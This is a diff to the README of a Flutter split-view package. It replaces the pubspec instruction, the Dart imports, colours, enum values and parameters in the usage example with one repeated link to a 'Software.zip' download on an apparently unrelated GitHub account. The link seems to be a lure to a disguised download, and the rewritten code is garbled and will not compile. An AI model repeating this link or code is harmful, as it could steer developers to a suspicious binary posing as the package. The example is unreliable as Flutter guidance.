@@ -3,12 +3,12 @@
 A splitter view for flutter.
 
 ## Usage
-To use this plugin, add split_view as a [dependency in your pubspec.yaml file](https://flutter.io/platform-plugins/).
+To use this plugin, add split_view as a [dependency in your https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip file](https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip).
 
 ## Example
 ```dart
-import 'package:flutter/material.dart';
-import 'package:split_view/split_view.dart';
+import 'https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip';
+import 'https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip';
 
 void main() => runApp(MyApp());
 
@@ -19,7 +19,7 @@ class MyApp extends StatelessWidget {
     return MaterialApp(
       title: 'Flutter Demo',
       theme: ThemeData(
-        primarySwatch: Colors.blue,
+        primarySwatch: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
       ),
       home: MyHomePage(title: 'Flutter Demo Home Page'),
     );
@@ -27,7 +27,7 @@ class MyApp extends StatelessWidget {
 }
 
 class MyHomePage extends StatefulWidget {
-  MyHomePage({Key key, this.title}) : super(key: key);
+  MyHomePage({Key key, https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip}) : super(key: key);
 
   final String title;
 
@@ -40,46 +40,46 @@ class _MyHomePageState extends State<MyHomePage> {
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: Text(widget.title!),
+        title: Text(https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip!),
       ),
       body: SplitView(
         children: [
           SplitView(
-            viewMode: SplitViewMode.Horizontal,
-            indicator: SplitIndicator(viewMode: SplitViewMode.Horizontal),
+            viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
+            indicator: SplitIndicator(viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip),
             activeIndicator: SplitIndicator(
-              viewMode: SplitViewMode.Horizontal,
+              viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
               isActive: true,
             ),
             children: [
               Container(
                 child: Center(child: Text("View1")),
-                color: Colors.red,
+                color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
               ),
               Container(
                 child: Center(child: Text("View2")),
-                color: Colors.blue,
+                color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
               ),
               Container(
                 child: Center(child: Text("View3")),
-                color: Colors.green,
+                color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
               ),
             ],
             onWeightChanged: (w) => print("Horizon: $w"),
           ),
           Container(
             child: Center(child: Text("View4")),
-            color: Colors.purple,
+            color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
           ),
           Container(
             child: Center(child: Text("View5")),
-            color: Colors.yellow,
+            color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
           ),
         ],
-        viewMode: SplitViewMode.Vertical,
-        indicator: SplitIndicator(viewMode: SplitViewMode.Vertical),
+        viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
+        indicator: SplitIndicator(viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip),
         activeIndicator: SplitIndicator(
-          viewMode: SplitViewMode.Vertical,
+          viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
           isActive: true,
         ),
         controller: SplitViewController(limits: [null, WeightLimit(max: 0.5)]),
